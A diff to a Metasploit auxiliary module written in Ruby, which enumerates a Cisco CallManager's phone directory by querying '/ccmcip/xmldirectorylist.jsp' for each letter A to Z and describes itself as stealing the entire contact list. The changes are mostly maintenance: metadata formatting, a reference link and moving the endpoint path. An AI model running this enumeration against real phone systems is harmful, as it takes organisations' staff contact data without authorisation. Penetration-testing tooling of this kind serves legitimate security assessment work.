@@ -9,16 +9,21 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-											'Name' => 'Cisco IP Phone Directory List Enumerator',
-											'Description' => %q{
-																This module attempts to query a Cisco IP Phone to steal its entire contact list.
-												},
-											'Author' => ['Matt "hostess" Andreko <mandreko@accuvant.com>']
-					))
+			'Name' => 'Cisco IP Phone Directory List Enumerator',
+			'Description' => %q{
+								This module attempts to query the CallManager for a Cisco IP Phone 7940 or 7960
+								 to steal its entire contact list.
+				},
+			'Author' => ['Matt "hostess" Andreko <mandreko[at]accuvant.com>'],
+			'References'     =>
+				[
+					[ 'URL', 'http://www.cisco.com/en/US/prod/collateral/voicesw/ps6788/phones/ps379/product_data_sheet09186a00800925a8.html' ],
+				]
+		))
 
 		register_options(
 				[
-						OptString.new('TARGETURI', [true, 'The URI path to the Cisco Web UI', '/']),
+						OptString.new('TARGETURI', [true, 'The URI path to the Cisco CallManager API', '/ccmcip/xmldirectorylist.jsp']),
 						Opt::RPORT(8080),
 						OptString.new('OUTFILE', [false, "A filename to store the generated directory contact list"]),
 				], self.class)
@@ -45,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		@users = Hash.new
 		("A".."Z").each do |current_letter|
 			r = send_request_cgi({
-				'uri' => "#{target_uri.to_s}ccmcip/xmldirectorylist.jsp?l=#{current_letter}",
+				'uri' => "#{target_uri.to_s}?l=#{current_letter}",
 				'method' => 'GET',
 			})
 
